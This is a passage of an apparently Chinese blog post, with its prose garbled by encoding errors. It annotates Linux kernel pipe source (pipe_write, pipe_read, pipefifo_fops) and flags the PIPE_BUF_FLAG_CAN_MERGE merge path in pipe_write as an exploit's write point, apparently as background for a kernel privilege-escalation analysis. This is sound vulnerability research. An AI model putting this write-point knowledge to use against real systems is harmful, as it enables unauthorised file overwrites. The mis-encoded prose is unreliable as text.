class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ç®¡é“å‡½æ•°è¡¨ï¼š">ç®¡é“å‡½æ•°è¡¨ï¼š</h3><p>é˜…è¯» pipe ç³»ç»Ÿè°ƒç”¨æºç ï¼Œæ³¨æ„åˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">do_pipe2</span>()</span><br><span class="hljs-function"><span class="hljs-title">__do_pipe_flags</span>()</span><br><span class="hljs-function"><span class="hljs-title">create_pipe_files</span>()</span><br><span class="hljs-function"><span class="hljs-title">alloc_file_pseudo</span>()</span><br></code></pre></td></tr></table></figure><p>åœ¨åˆ›å»ºç®¡é“æ–‡ä»¶çš„å‡½æ•° <code>create_pipe_files()</code> ä¸­ï¼Œä¼ å…¥ <code>alloc_file_pseudo()</code> çš„å‡½æ•°è¡¨ä¸º <code>pipefifo_fops</code>ï¼Œè¿™ä¾¿æ˜¯ç®¡é“ç›¸å…³çš„æ“ä½œçš„å‡½æ•°è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_pipe_files</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file **res, <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>&amp;pipefifo_fops);<br>    <br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°è¡¨ä¸­å®šä¹‰äº†æˆ‘ä»¬å¯¹ç®¡é“çš„ç›¸å…³æ“ä½œä¼šè°ƒç”¨åˆ°çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>.splice_write= iter_file_splice_write,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ç®¡é“çš„å†™å…¥è¿‡ç¨‹">ç®¡é“çš„å†™å…¥è¿‡ç¨‹</h3><p>æŸ¥è¡¨ <code>pipefifo_fops</code> å¯çŸ¥å½“æˆ‘ä»¬å‘ç®¡é“å†…å†™å…¥æ•°æ®æ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>pipe_write</code> å‡½æ•°ï¼Œå¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è‹¥ç®¡é“éç©ºä¸”ä¸Šä¸€ä¸ª buf æœªæ»¡ï¼Œåˆ™å…ˆå°è¯•å‘ä¸Šä¸€ä¸ªè¢«å†™å…¥çš„ bufferå†™å…¥æ•°æ®ï¼ˆè‹¥è¯¥ buffer è®¾ç½®äº†<code>PIPE_BUF_FLAG_CAN_MERGE</code> æ ‡å¿—ä½ï¼‰</li><li>æ¥ä¸‹æ¥å¼€å§‹å¯¹æ–°çš„ buffer è¿›è¡Œæ•°æ®å†™å…¥ï¼Œè‹¥æ²¡æœ‰<code>PIPE_BUF_FLAG_CAN_MERGE</code> æ ‡å¿—ä½åˆ™åˆ†é…æ–°é¡µé¢åå†™å…¥</li><li>å¾ªç¯ç¬¬äºŒæ­¥ç›´åˆ°å®Œæˆå†™å…¥ï¼Œè‹¥ç®¡é“æ»¡äº†åˆ™ä¼šå°è¯•å”¤é†’è¯»è€…è®©ç®¡é“è…¾å‡ºç©ºé—´</li></ul><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡º <code>PIPE_BUF_FLAG_CAN_MERGE</code> <strong>ç”¨ä»¥æ ‡è¯†ä¸€ä¸ª pipe_buffer æ˜¯å¦å·²ç»åˆ†é…äº†å¯ä»¥å†™å…¥çš„ç©ºé—´</strong>ï¼Œåœ¨å¤§å¾ªç¯ä¸­è‹¥å¯¹åº” pipe_buffer æ²¡æœ‰è®¾ç½®è¯¥ flagï¼ˆåˆšè¢«åˆå§‹åŒ–ï¼‰ï¼Œåˆ™ä¼š<strong>æ–°åˆ†é…ä¸€ä¸ªé¡µé¢ä¾›å†™å…¥ï¼Œå¹¶è®¾ç½®è¯¥æ ‡å¿—ä½</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">ssize_t</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(from);<br><span class="hljs-type">ssize_t</span> chars;<br><span class="hljs-type">bool</span> was_empty = <span class="hljs-literal">false</span>;<br><span class="hljs-type">bool</span> wake_next_writer = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/* Null write succeeds. */</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<span class="hljs-comment">// ç®¡é“æ²¡æœ‰è¯»è€…ï¼Œè¿”å›</span><br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>ret = -EPIPE;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (pipe-&gt;watch_queue) &#123;<br>ret = -EXDEV;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ç®¡é“éç©ºï¼Œæˆ‘ä»¬å°è¯•å°†æ–°æ•°æ®åˆå¹¶åˆ°æœ€åä¸€ä¸ªbuffer ä¸­</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è¿™è‡ªç„¶ä¼šåˆå¹¶å°çš„å†™æ“ä½œï¼Œä½†å…¶ä¹Ÿä¼šå¯¹</span><br><span class="hljs-comment"> * è·¨è¶Šå¤šä¸ªé¡µæ¡†çš„å¤§çš„å†™æ“ä½œçš„å‰©ä½™å†™å…¥æ“ä½œ</span><br><span class="hljs-comment"> * è¿›è¡Œé¡µé¢å¯¹é½</span><br><span class="hljs-comment"> * ï¼ˆè¯‘æ³¨ï¼šå¤§æ¦‚å°±æ˜¯å…ˆå°è¯•æŠŠæ•°æ®å†™åˆ°ç®¡é“çš„æœ€åä¸€ä¸ªbufferï¼ˆå¦‚æœå¯¹åº” page æ²¡å†™æ»¡çš„è¯ï¼‰ï¼‰</span><br><span class="hljs-comment"> */</span><br>head = pipe-&gt;head;<span class="hljs-comment">// è·å–é˜Ÿåˆ—å¤´</span><br>was_empty = pipe_empty(head, pipe-&gt;tail); <span class="hljs-comment">// head == tail</span><br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="hljs-comment">// ç®¡é“éç©ºï¼Œä¸”ä¸Šä¸€ä¸ª buf æ²¡å†™æ»¡</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask]; <span class="hljs-comment">// æ‰¾åˆ°ä¸Šä¸€ä¸ª buf</span><br><span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * è®¾ç½®äº†PIPE_BUF_FLAG_CAN_MERGEæ ‡å¿—ä½ï¼Œ</span><br><span class="hljs-comment">         * è¯´æ˜è¯¥ buffer å¯ç”¨äºç›´æ¥å†™å…¥ï¼Œ</span><br><span class="hljs-comment">         * ç›´æ¥æŠŠæ•°æ®æ‹·è´è¿›å»åå°±è¿”å›</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// æ³¨ï¼šè¿™æ˜¯æ¼æ´åˆ©ç”¨çš„å†™å…¥ç‚¹</span><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>    offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>ret = -EFAULT;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>buf-&gt;len += ret;<br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br>    <span class="hljs-comment">// å†™æ»¡ last buffer å¯¹åº”æ•°æ®åï¼Œæ¥ä¸‹æ¥å°†å‰©ä½™æ•°æ®å†™åˆ°å¾€åçš„ buffer ä¸­</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<span class="hljs-comment">// æ²¡æœ‰è¯»è€…ï¼Œè¿”å›</span><br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123; <span class="hljs-comment">// ç®¡é“æ²¡æ»¡ï¼Œæ­£å¸¸å†™å…¥</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><span class="hljs-type">int</span> copied;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<span class="hljs-comment">// æ²¡æœ‰é¢„å…ˆå‡†å¤‡pageï¼Œåˆ†é…ä¸€ä¸ªæ–°çš„</span><br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br><span class="hljs-comment">/* æå‰åœ¨ç¯ä¸­åˆ†é…ä¸€ä¸ª slotï¼Œå¹¶é™„åŠ ä¸€ä¸ªç©º bufferã€‚</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬å‡ºé”™æˆ–æœªèƒ½ä½¿ç”¨å®ƒï¼Œ</span><br><span class="hljs-comment"> * å®ƒä¼šè¢«è¯»è€…æ‰€ä½¿ç”¨ï¼Œ</span><br><span class="hljs-comment"> * äº¦æˆ–æ˜¯ä¿ç•™åœ¨è¿™é‡Œç­‰å¾…ä¸‹ä¸€æ¬¡å†™å…¥ã€‚</span><br><span class="hljs-comment"> */</span><br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<span class="hljs-comment">// ç®¡é“æ»¡äº†ï¼Œå¼€å¯ä¸‹ä¸€æ¬¡å¾ªç¯</span><br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br>pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br><span class="hljs-comment">/* å°†å…¶æ’å…¥ buffer array ä¸­ */</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<span class="hljs-comment">// è®¾ç½® buffer çš„ flagï¼Œè‹¥è®¾ç½®äº† O_DIRECT åˆ™ä¸º PACKET</span><br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<span class="hljs-comment">// å°†æ•°æ®æ‹·è´åˆ° buffer å¯¹åº” page ä¸Š</span><br><span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += copied;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = copied;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<span class="hljs-comment">// è¯»å®Œæ•°æ®äº†ï¼Œé€€å‡ºå¾ªç¯</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<span class="hljs-comment">// ç®¡é“æ²¡æ»¡ï¼Œç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯</span><br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/* ç­‰å¾…ç¼“å†²åŒºç©ºé—´å¯ç”¨. */</span><br>        <span class="hljs-comment">// ç®¡é“æ»¡äº†ï¼Œç­‰ä»–å˜ç©º</span><br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -ERESTARTSYS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬å°†é‡Šæ”¾ç®¡é“çš„é”ï¼Œç­‰å¾…ï¼ˆæœ‰ï¼‰æ›´å¤šçš„ç©ºé—´ã€‚</span><br><span class="hljs-comment"> * è‹¥æœ‰å¿…è¦æˆ‘ä»¬å°†å”¤é†’ä»»æ„è¯»è€…ï¼Œåœ¨ç­‰å¾…åæˆ‘ä»¬éœ€è¦é‡æ–°æ£€æŸ¥</span><br><span class="hljs-comment"> * åœ¨æˆ‘ä»¬é‡Šæ”¾é”åç®¡é“æ˜¯å¦å˜ç©ºäº†</span><br><span class="hljs-comment"> */</span><br>__pipe_unlock(pipe);<br><span class="hljs-keyword">if</span> (was_empty)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));<br>__pipe_lock(pipe);<br>was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);<br>wake_next_writer = <span class="hljs-literal">true</span>;<br>&#125;<br>out:<br><span class="hljs-keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))<br>wake_next_writer = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬è¿›è¡Œäº†ä¸€æ¬¡å”¤é†’äº‹ä»¶ï¼Œæˆ‘ä»¬åšä¸€ä¸ªâ€œåŒæ­¥â€å”¤é†’ï¼Œ</span><br><span class="hljs-comment"> * å› ä¸ºç›¸æ¯”èµ·è®©æ•°æ®ä»æ—§ç­‰å¾…ï¼Œæˆ‘ä»¬æƒ³è¦è®©è¯»è€…å»å°½å¿«</span><br><span class="hljs-comment"> * å¤„ç†äº‹æƒ…</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å°¤å…¶æ˜¯ï¼Œè¿™å¯¹å°çš„å†™æ“ä½œé‡è¦ï¼Œè¿™æ˜¯å› ä¸ºï¼ˆä¾‹å¦‚ï¼‰GNU è®©</span><br><span class="hljs-comment"> * jobserver ä½¿ç”¨å°çš„å†™æ“ä½œæ¥å”¤é†’ç­‰å¾…çš„å·¥ä½œ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Epoll åˆ™æ²¡æœ‰æ„ä¹‰åœ°æƒ³è¦ä¸€ä¸ªå”¤é†’ï¼Œ</span><br><span class="hljs-comment"> * æ— è®ºç®¡é“æ˜¯å¦å·²ç»ç©ºäº†</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (was_empty || pipe-&gt;poll_usage)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br><span class="hljs-keyword">if</span> (wake_next_writer)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;<br><span class="hljs-type">int</span> err = file_update_time(filp);<br><span class="hljs-keyword">if</span> (err)<br>ret = err;<br>sb_end_write(file_inode(filp)-&gt;i_sb);<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç®¡é“çš„è¯»å‡ºè¿‡ç¨‹">ç®¡é“çš„è¯»å‡ºè¿‡ç¨‹</h3><p>ä»ç®¡é“ä¸­è¯»å‡ºæ•°æ®åˆ™æ˜¯é€šè¿‡ <code>pipe_read</code>ï¼Œä¸»è¦æ˜¯è¯»å– buffer å¯¹åº” page ä¸Šçš„æ•°æ®ï¼Œè‹¥ä¸€ä¸ª buffer è¢«è¯»å®Œäº†åˆ™å°†å…¶å‡ºåˆ—</p><p>åŸç†è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿™é‡Œå°±ä¸æ·±å…¥åˆ†æäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *to)</span><br>&#123;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(to);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">bool</span> was_full, wake_next_reader = <span class="hljs-literal">false</span>;<br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-comment">/* Null read succeeds. */</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span 